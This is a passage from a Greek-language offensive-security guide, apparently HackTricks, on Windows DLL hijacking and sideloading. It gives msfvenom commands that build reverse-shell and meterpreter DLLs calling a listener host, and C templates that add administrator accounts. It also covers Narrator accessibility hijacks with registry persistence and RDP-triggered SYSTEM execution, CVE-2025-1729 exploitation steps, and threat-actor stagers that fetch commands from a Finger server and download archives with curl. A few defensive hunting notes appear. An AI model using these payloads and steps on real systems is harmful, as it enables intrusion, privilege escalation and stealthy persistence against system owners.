Σε περίπτωση που εντοπίσετε ένα exploitable σενάριο, ένα από τα σημαντικότερα πράγματα για την επιτυχή εκμετάλλευσή του είναι να **δημιουργήσετε ένα dll που εξάγει τουλάχιστον όλες τις functions που θα εισαγάγει το executable από αυτό**. Σε κάθε περίπτωση, σημειώστε ότι το DLL Hijacking είναι χρήσιμο για [κλιμάκωση από το επίπεδο Medium Integrity στο High **(παράκαμψη του UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) ή από[ **High Integrity σε SYSTEM**](../index.html#from-high-integrity-to-system)**.** Μπορείτε να βρείτε ένα παράδειγμα για το **πώς να δημιουργήσετε ένα valid dll** μέσα σε αυτή τη μελέτη για το DLL hijacking, η οποία επικεντρώνεται στο DLL hijacking για execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Επιπλέον, στην **επόμενη ενότη**τα μπορείτε να βρείτε μερικούς **βασικούς κώδικες dll** που μπορεί να φανούν χρήσιμοι ως **templates** ή για τη δημιουργία ενός **dll με exported functions που δεν απαιτούνται**.

## **Δημιουργία και compilation DLLs**

### **DLL Proxifying**

Βασικά, ένα **DLL proxy** είναι ένα DLL που μπορεί να **εκτελεί τον κακόβουλο κώδικά σας όταν φορτώνεται**, αλλά επίσης να **εκθέτει** και να **λειτουργεί** όπως **αναμένεται**, **προωθώντας όλες τις κλήσεις στην πραγματική βιβλιοθήκη**.

Με το εργαλείο [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ή [**Spartacus**](https://github.com/Accenture/Spartacus) μπορείτε να **υποδείξετε ένα executable και να επιλέξετε τη βιβλιοθήκη** που θέλετε να κάνετε proxify και να **δημιουργήσετε ένα proxified dll** ή να **υποδείξετε το DLL** και να **δημιουργήσετε ένα proxified dll**.

### **Meterpreter**

**Λήψη rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Αποκτήστε ένα meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Δημιουργία χρήστη (x86, δεν είδα έκδοση x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Το δικό σας

Σε πολλές περιπτώσεις, το DLL που μεταγλωττίζετε πρέπει να **εξάγει κάθε συνάρτηση που εισάγεται από τη διεργασία-θύμα**. Αν λείπει κάποια απαιτούμενη εξαγωγή, το binary δεν μπορεί να την επιλύσει και το exploit αποτυγχάνει.

<details>
<summary>Πρότυπο C DLL (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Παράδειγμα C++ DLL με δημιουργία χρήστη</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Εναλλακτικό C DLL με σημείο εισόδου νήματος</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Μελέτη περίπτωσης: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Το Windows Narrator.exe εξακολουθεί κατά την εκκίνηση να αναζητά ένα προβλέψιμο, ειδικό για τη γλώσσα localization DLL, το οποίο μπορεί να γίνει hijack για arbitrary code execution και persistence.<sup>[[7]](#references)</sup>

Βασικά στοιχεία
- Probe path (τρέχουσες εκδόσεις): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (παλαιότερες εκδόσεις): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Εάν υπάρχει ένα writable DLL που ελέγχεται από τον attacker στο OneCore path, φορτώνεται και εκτελείται το `DllMain(DLL_PROCESS_ATTACH)`. Δεν απαιτούνται exports.

Discovery με Procmon
- Filter: `Process Name is Narrator.exe` και `Operation is Load Image` ή `CreateFile`.
- Εκκινήστε το Narrator και παρατηρήστε την απόπειρα φόρτωσης του παραπάνω path.

Ελάχιστο DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC σιωπή
- Ένα naive hijack θα μιλήσει/θα επισημάνει στοιχεία στο UI. Για να παραμείνει αθόρυβο, κατά την προσάρτηση απαριθμήστε τα threads του Narrator, ανοίξτε το κύριο thread (`OpenThread(THREAD_SUSPEND_RESUME)`) και εφαρμόστε `SuspendThread` σε αυτό· συνεχίστε στο δικό σας thread. Δείτε το PoC για τον πλήρη κώδικα.<sup>[[8]](#references)</sup>

Trigger και persistence μέσω Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Με τα παραπάνω, η εκκίνηση του Narrator φορτώνει το planted DLL. Στο secure desktop (οθόνη σύνδεσης), πατήστε CTRL+WIN+ENTER για να εκκινήσετε το Narrator· το DLL σας εκτελείται ως SYSTEM στο secure desktop.

Εκτέλεση SYSTEM μέσω RDP-triggered (lateral movement)
- Επιτρέψτε το classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Συνδεθείτε μέσω RDP στο host· στην οθόνη σύνδεσης πατήστε CTRL+WIN+ENTER για να εκκινήσετε το Narrator· το DLL σας εκτελείται ως SYSTEM στο secure desktop.
- Η εκτέλεση σταματά όταν κλείσει το RDP session—κάντε inject/migrate άμεσα.

Bring Your Own Accessibility (BYOA)
- Μπορείτε να κλωνοποιήσετε μια ενσωματωμένη καταχώριση Accessibility Tool (AT) στο registry (π.χ. CursorIndicator), να την επεξεργαστείτε ώστε να δείχνει σε ένα arbitrary binary/DLL, να την κάνετε import και, στη συνέχεια, να ορίσετε το `configuration` σε αυτό το όνομα AT. Με αυτόν τον τρόπο γίνεται proxy για arbitrary execution στο πλαίσιο του Accessibility.

Σημειώσεις
- Η εγγραφή στο `%windir%\System32` και η αλλαγή τιμών HKLM απαιτούν δικαιώματα admin.
- Όλη η λογική του payload μπορεί να βρίσκεται στο `DLL_PROCESS_ATTACH`· δεν απαιτούνται exports.

## Case Study: CVE-2025-1729 - Privilege Escalation με χρήση του TPQMAssistant.exe

Αυτό το case παρουσιάζει **Phantom DLL Hijacking** στο Lenovo TrackPoint Quick Menu (`TPQMAssistant.exe`), το οποίο έχει καταγραφεί ως **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Vulnerability Details

- **Component**: `TPQMAssistant.exe`, το οποίο βρίσκεται στο `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: Το `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` εκτελείται καθημερινά στις 9:30 π.μ. υπό το context του logged-on user.
- **Directory Permissions**: Εγγράψιμα από τον `CREATOR OWNER`, επιτρέποντας σε local users να τοποθετούν arbitrary files.
- **DLL Search Behavior**: Επιχειρεί να φορτώσει το `hostfxr.dll` πρώτα από το working directory του και καταγράφει "NAME NOT FOUND" όταν λείπει, υποδεικνύοντας precedence στην αναζήτηση του local directory.

### Exploit Implementation

Ένας attacker μπορεί να τοποθετήσει ένα malicious `hostfxr.dll` stub στον ίδιο κατάλογο, εκμεταλλευόμενος το missing DLL για να επιτύχει code execution υπό το context του user:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Ροή επίθεσης

1. Ως standard user, τοποθετήστε το `hostfxr.dll` στο `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Περιμένετε να εκτελεστεί η scheduled task στις 9:30 π.μ. υπό το context του τρέχοντος χρήστη.
3. Αν ένας administrator είναι συνδεδεμένος όταν εκτελείται η task, το malicious DLL εκτελείται στο session του administrator με medium integrity.
4. Συνδυάστε standard UAC bypass techniques για να πραγματοποιήσετε privilege escalation από medium integrity σε SYSTEM privileges.

## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Οι threat actors συνδυάζουν συχνά MSI-based droppers με DLL side-loading για να εκτελούν payloads υπό μια trusted, signed process.<sup>[[10]](#references)</sup>

Επισκόπηση αλυσίδας
- Ο χρήστης κατεβάζει ένα MSI. Ένα CustomAction εκτελείται αθόρυβα κατά την εγκατάσταση μέσω GUI (π.χ. LaunchApplication ή μια VBScript action), ανασυνθέτοντας το επόμενο στάδιο από embedded resources.
- Το dropper γράφει ένα legitimate, signed EXE και ένα malicious DLL στον ίδιο directory (παράδειγμα pair: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Όταν ξεκινά το signed EXE, η Windows DLL search order φορτώνει πρώτα το wsc.dll από το working directory, εκτελώντας attacker code υπό έναν signed parent (ATT&CK T1574.001).

Ανάλυση MSI (τι να αναζητήσετε)
- CustomAction table:
- Αναζητήστε entries που εκτελούν executables ή VBScript. Ύποπτο pattern: LaunchApplication που εκτελεί ένα embedded file στο background.
- Στο Orca (Microsoft Orca.exe), επιθεωρήστε τα CustomAction, InstallExecuteSequence και Binary tables.
- Embedded/split payloads στο MSI CAB:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Ή χρησιμοποιήστε το lessmsi: lessmsi x package.msi C:\out
- Αναζητήστε πολλά μικρά fragments που συνενώνονται και αποκρυπτογραφούνται από ένα VBScript CustomAction. Συνήθης ροή:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Πρακτικό sideloading με το wsc_proxy.exe
- Τοποθετήστε αυτά τα δύο αρχεία στον ίδιο φάκελο:
- wsc_proxy.exe: νόμιμο signed host (Avast). Η διεργασία επιχειρεί να φορτώσει το wsc.dll με βάση το όνομά του από τον κατάλογό της.
- wsc.dll: attacker DLL. Αν δεν απαιτούνται συγκεκριμένα exports, μπορεί να αρκεί το DllMain· διαφορετικά, δημιουργήστε ένα proxy DLL και προωθήστε τα απαιτούμενα exports στη γνήσια βιβλιοθήκη, εκτελώντας το payload στο DllMain.
- Δημιουργήστε ένα minimal DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Για requirements εξαγωγής, χρησιμοποιήστε ένα proxying framework (π.χ. DLLirant/Spartacus) για να δημιουργήσετε ένα forwarding DLL που εκτελεί επίσης το payload σας.

- Αυτή η τεχνική βασίζεται στην επίλυση ονομάτων DLL από το host binary. Αν το host χρησιμοποιεί absolute paths ή safe loading flags (π.χ. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), το hijack μπορεί να αποτύχει.
- Τα KnownDLLs, SxS και τα forwarded exports μπορούν να επηρεάσουν την προτεραιότητα και πρέπει να λαμβάνονται υπόψη κατά την επιλογή του host binary και του export set.

## Signed triads + encrypted payloads (ShadowPad case study)

Η Check Point περιέγραψε πώς το Ink Dragon αναπτύσσει το ShadowPad χρησιμοποιώντας ένα **three-file triad**, ώστε να ενσωματώνεται σε legitimate software, διατηρώντας παράλληλα το core payload encrypted στον δίσκο:<sup>[[12]](#references)</sup>

1. **Signed host EXE** – γίνεται κατάχρηση vendors όπως η AMD, η Realtek ή η NVIDIA (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Οι attackers μετονομάζουν το executable ώστε να μοιάζει με Windows binary (για παράδειγμα `conhost.exe`), αλλά η Authenticode signature παραμένει έγκυρη.
2. **Malicious loader DLL** – αποθηκεύεται δίπλα στο EXE με το αναμενόμενο όνομα (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). Το DLL είναι συνήθως ένα MFC binary obfuscated με το ScatterBrain framework· μοναδικός σκοπός του είναι να εντοπίσει το encrypted blob, να το αποκρυπτογραφήσει και να κάνει reflective mapping το ShadowPad.
3. **Encrypted payload blob** – συχνά αποθηκεύεται ως `<name>.tmp` στον ίδιο directory. Μετά το memory-mapping του decrypted payload, ο loader διαγράφει το TMP file για να καταστρέψει forensic evidence.

Tradecraft notes:

* Η μετονομασία του signed EXE (ενώ διατηρείται το αρχικό `OriginalFileName` στο PE header) του επιτρέπει να μεταμφιέζεται σε Windows binary, διατηρώντας παράλληλα τη vendor signature. Επομένως, αναπαραγάγετε τη συνήθεια του Ink Dragon να αποθηκεύει binaries που μοιάζουν με `conhost.exe`, αλλά στην πραγματικότητα είναι AMD/NVIDIA utilities.
* Επειδή το executable παραμένει trusted, τα περισσότερα allowlisting controls χρειάζονται μόνο το malicious DLL δίπλα του. Εστιάστε στην προσαρμογή του loader DLL· το signed parent συνήθως μπορεί να εκτελεστεί χωρίς αλλαγές.
* Ο decryptor του ShadowPad απαιτεί το TMP blob να βρίσκεται δίπλα στον loader και να είναι writable, ώστε να μπορεί να μηδενίσει το file μετά το mapping. Διατηρήστε τον directory writable μέχρι να φορτωθεί το payload· μόλις βρεθεί στη memory, το TMP file μπορεί να διαγραφεί με ασφάλεια για λόγους OPSEC.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Οι operators συνδυάζουν DLL sideloading με LOLBAS, ώστε το μοναδικό custom artifact στον δίσκο να είναι το malicious DLL δίπλα στο trusted EXE:<sup>[[1]](#references)</sup>

- **Remote command loader (Finger):** Το hidden PowerShell κάνει spawn το `cmd.exe /c`, λαμβάνει commands από έναν Finger server και τα διοχετεύει στο `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- Το `finger user@host` λαμβάνει TCP/79 text· το `| cmd` εκτελεί την απόκριση του server, επιτρέποντας στους operators να αλλάζουν το second stage από την πλευρά του server.

- **Built-in download/extract:** Κατεβάστε ένα archive με benign extension, αποσυμπιέστε το και κάντε stage το sideload target μαζί με το DLL σε έναν τυχαίο `%LocalAppData%` folder:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- Το `curl -s -L` αποκρύπτει την πρόοδο και ακολουθεί redirects· το `tar -xf` χρησιμοποιεί το ενσωματωμένο tar των Windows.

- **WMI/CIM launch:** Εκκινήστε το EXE μέσω WMI, ώστε η telemetry να εμφανίζει μια CIM-created process, ενώ αυτό φορτώνει το colocated DLL:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Λειτουργεί με binaries που προτιμούν local DLLs (π.χ. `intelbq.exe`, `nearby_share.exe`)· το payload (π.χ. Remcos) εκτελείται υπό το trusted name.

- **Hunting:** Δημιουργήστε alert για `forfiles` όταν τα `/p`, `/m` και `/c` εμφανίζονται μαζί· αυτό είναι ασυνήθιστο εκτός admin scripts.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Μια πρόσφατη intrusion του Lotus Blossom έκανε κατάχρηση μιας trusted update chain για να παραδώσει ένα NSIS-packed dropper, το οποίο έκανε stage ένα DLL sideload μαζί με πλήρως in-memory payloads.<sup>[[13]](#references)</sup>

Tradecraft flow
- Το `update.exe` (NSIS) δημιουργεί το `%AppData%\Bluetooth`, το χαρακτηρίζει **HIDDEN**, αποθηκεύει ένα renamed Bitdefender Submission Wizard `BluetoothService.exe`, ένα malicious `log.dll` και ένα encrypted blob `BluetoothService`, και στη συνέχεια εκκινεί το EXE.
- Το host EXE κάνει import το `log.dll` και καλεί τα `LogInit`/`LogWrite`. Το `LogInit` κάνει mmap-load το blob· το `LogWrite` το αποκρυπτογραφεί με ένα custom LCG-based stream (constants **0x19660D** / **0x3C6EF35F**, με key material που προέρχεται από προηγούμενο hash), κάνει overwrite το buffer με plaintext shellcode, απελευθερώνει τα προσωρινά δεδομένα και κάνει jump σε αυτό.
- Για την αποφυγή IAT, ο loader επιλύει APIs κάνοντας hashing στα export names με χρήση **FNV-1a basis 0x811C9DC5 + prime 0x100019**, και στη συνέχεια εφαρμόζοντας ένα Murmur-style avalanche (**0x85EBCA6B**) και συγκρίνοντας με salted target hashes.

Main shellcode (Chrysalis)
- Αποκρυπτογραφεί ένα PE-like main module με επαναλαμβανόμενα add/XOR/sub και key `gQ2JR&9;` σε πέντε passes, και στη συνέχεια φορτώνει δυναμικά το `Kernel32.dll` → `GetProcAddress` για να ολοκληρώσει το import resolution.
- Ανακατασκευάζει DLL name strings κατά το runtime μέσω per-character bit-rotate/XOR transforms και στη συνέχεια φορτώνει τα `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Χρησιμοποιεί έναν δεύτερο resolver που διασχίζει το **PEB → InMemoryOrderModuleList**, αναλύει κάθε export table σε blocks των 4-byte με Murmur-style mixing και κάνει fallback στο `GetProcAddress` μόνο αν το hash δεν βρεθεί.

Embedded configuration & C2
- Το Config βρίσκεται μέσα στο dropped `BluetoothService` file στο **offset 0x30808** (size **0x980**) και αποκρυπτογραφείται με RC4 χρησιμοποιώντας το key `qwhvb^435h&*7`, αποκαλύπτοντας το C2 URL και το User-Agent.
- Τα beacons δημιουργούν ένα dot-delimited host profile, προσθέτουν μπροστά το tag `4Q` και στη συνέχεια το κρυπτογραφούν με RC4 χρησιμοποιώντας το key `vAuig34%^325hGV`, πριν από το `HttpSendRequestA` μέσω HTTPS. Οι responses αποκρυπτογραφούνται με RC4 και γίνεται dispatch μέσω ενός tag switch (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- Το execution mode καθορίζεται από CLI args: χωρίς args = install persistence (service/Run key) που δείχνει στο `-i`· το `-i` κάνει relaunch το self με `-k`· το `-k` παρακάμπτει το install και εκτελεί το payload.

Alternate loader observed
- Η ίδια intrusion έκανε drop το Tiny C Compiler και εκτέλεσε το `svchost.exe -nostdlib -run conf.c` από το `C:\ProgramData\USOShared\`, με το `libtcc.dll` δίπλα του. Ο C source που παρείχε ο attacker περιείχε shellcode, γινόταν compile και εκτελούνταν in-memory χωρίς να αποθηκευτεί PE στον δίσκο. Αναπαραγάγετε με:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Αυτό το στάδιο compile-and-run που βασίζεται στο TCC εισήγαγε το `Wininet.dll` κατά τον χρόνο εκτέλεσης και ανέκτησε ένα second-stage shellcode από ένα hardcoded URL, παρέχοντας έναν ευέλικτο loader που μεταμφιέζεται ως εκτέλεση compiler.

## Sideloading από signed host με export proxying + στάθμευση thread του host

Ορισμένες αλυσίδες DLL sideloading προσθέτουν **engineering σταθερότητας**, ώστε ο νόμιμος host να παραμένει ενεργός αρκετά ώστε να φορτώσει καθαρά τα επόμενα stages, αντί να καταρρεύσει μετά τη φόρτωση του malicious DLL.<sup>[[11]](#references)</sup>

Παρατηρούμενο μοτίβο
- Αποθέστε ένα αξιόπιστο EXE δίπλα σε ένα malicious DLL, χρησιμοποιώντας το αναμενόμενο όνομα dependency, όπως `version.dll`.
- Το malicious DLL κάνει **proxying σε κάθε αναμενόμενο export** προς το πραγματικό system DLL (για παράδειγμα `%SystemRoot%\\System32\\version.dll`), ώστε η επίλυση των imports να συνεχίζεται επιτυχώς και η διεργασία του host να εξακολουθεί να λειτουργεί.
- Μετά τη φόρτωση, το malicious DLL **τροποποιεί το entry point του host**, ώστε το κύριο thread να εισέρχεται σε έναν infinite βρόχο `Sleep`, αντί να τερματίζει ή να εκτελεί code paths που θα τερμάτιζαν τη διεργασία.
- Ένα νέο thread εκτελεί την πραγματική malicious εργασία: αποκρυπτογραφεί το όνομα ή το path του DLL του επόμενου stage (τα RC4/XOR είναι συνηθισμένα) και στη συνέχεια το εκκινεί με `LoadLibrary`.

Γιατί έχει σημασία
- Το κανονικό DLL proxying διατηρεί τη συμβατότητα API, αλλά δεν εγγυάται ότι ο host θα παραμείνει ενεργός αρκετά για τα επόμενα stages.
- Η στάθμευση του κύριου thread σε `Sleep(INFINITE)` είναι ένας απλός τρόπος να διατηρηθεί η signed διεργασία resident, ενώ ο loader εκτελεί decryption, staging ή network bootstrap σε ένα worker thread.
- Το hunting μόνο για ένα ύποπτο `DllMain` μπορεί να χάσει αυτό το μοτίβο, αν η ενδιαφέρουσα συμπεριφορά εμφανίζεται αφού τροποποιηθεί το entry point του host και ξεκινήσει ένα secondary thread.

Ελάχιστη ροή εργασίας
1. Αντιγράψτε το signed host EXE και προσδιορίστε το DLL που επιλύει από τον local directory.
2. Δημιουργήστε ένα proxy DLL που εξάγει τις ίδιες functions και τις προωθεί στο legitimate DLL.
3. Στο `DllMain(DLL_PROCESS_ATTACH)`, δημιουργήστε ένα worker thread.
4. Από αυτό το thread, τροποποιήστε το entry point του host ή τη start routine του κύριου thread, ώστε να εκτελεί loop με `Sleep`.
5. Αποκρυπτογραφήστε το όνομα/config του DLL του επόμενου stage και καλέστε `LoadLibrary` ή κάντε manual-map το payload.

Αμυντικές κατευθύνσεις
- Signed διεργασίες που φορτώνουν το `version.dll` ή παρόμοιες συνηθισμένες libraries από τον δικό τους application directory αντί για το `System32`.
- Memory patches στο entry point της διεργασίας λίγο μετά τη φόρτωση του image, ειδικά jumps/calls που ανακατευθύνονται στα `Sleep`/`SleepEx`.
- Threads που δημιουργούνται από ένα proxy DLL και καλούν αμέσως `LoadLibrary` σε ένα δεύτερο DLL με decrypted όνομα.
- Full-export proxy DLLs τοποθετημένα δίπλα σε vendor executables μέσα σε writable staging directories, όπως `ProgramData`, `%TEMP%` ή paths από unpacked archives.

## References

- [1] [Red Canary – Πληροφοριακές γνώσεις: Ιανουάριος 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - Privilege Escalation με χρήση του TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL hijacking στα Windows. Απλό παράδειγμα C.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Το Nimbus Manticore αναπτύσσει νέο malware που στοχεύει την Ευρώπη](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: Όταν τα DLL Hijacks συναντούν τους Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Digital Doppelgangers: Ανατομία εξελισσόμενων εκστρατειών impersonation που διανέμουν το Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Συγκλίνοντα ενδιαφέροντα: Ανάλυση threat clusters που στοχεύουν μια κυβέρνηση της Νοτιοανατολικής Ασίας](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Μέσα στο Ink Dragon: Αποκαλύπτοντας το relay network και την εσωτερική λειτουργία μιας stealthy offensive operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – Το Chrysalis Backdoor: Μια εις βάθος ανάλυση του toolkit του Lotus Blossom](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → αλυσίδα DLL hijack](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Παρακολούθηση των espionage campaigns του Iranian APT Screening Serpens το 2026](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – στοιχείο `<appDomainManagerAssembly>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – στοιχείο `<appDomainManagerType>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – στοιχείο `<probing>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – στοιχείο `<bypassTrustedAppStrongNames>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – στοιχείο `<publisherPolicy>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – στοιχείο `<requiredRuntime>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Fast and Furious: Οι επιχειρήσεις του Nimbus Manticore κατά τη διάρκεια της ιρανικής σύγκρουσης](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – Το CL-STA-1062 στοχεύει κυβερνήσεις και critical infrastructure της Νοτιοανατολικής Ασίας](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
{{#include ../../../banners/hacktricks-training.md}}
